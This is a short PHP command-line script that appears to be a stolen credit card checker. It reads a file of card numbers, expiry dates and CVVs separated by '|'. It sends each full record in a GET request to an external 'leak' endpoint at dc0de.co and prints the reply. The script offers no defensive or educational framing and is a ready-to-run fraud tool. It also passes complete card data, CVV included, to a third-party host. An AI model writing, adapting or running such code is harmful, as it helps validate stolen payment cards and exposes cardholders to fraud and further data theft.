<?php
error_reporting(0);
echo "List CC : ";
$xyz = trim(fgets(STDIN));
echo "\n";
foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
    $pecah = explode("|", trim($akun));
    $card = trim($pecah[0]);
    $month = trim($pecah[1]);
    $year = trim($pecah[2]);
    $cvv = trim($pecah[3]);
$gas = curl('https://dc0de.co/free/leak/leak.php?empas='.$card.'|'.$month.'|'.$year.'|'.$cvv.'', null, null);
print_r($gas[1]);
}


function get_between($string, $start, $end) 
    {
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
    }

function curl($url,$post,$headers)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	$result = curl_exec($ch);
	// $header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
	$cookies = array();
	foreach($matches[1] as $item) {
	  parse_str($item, $cookie);
	  $cookies = array_merge($cookies, $cookie);
	}
	return array (
	$headers,
	$body,
	$cookies
	);
}
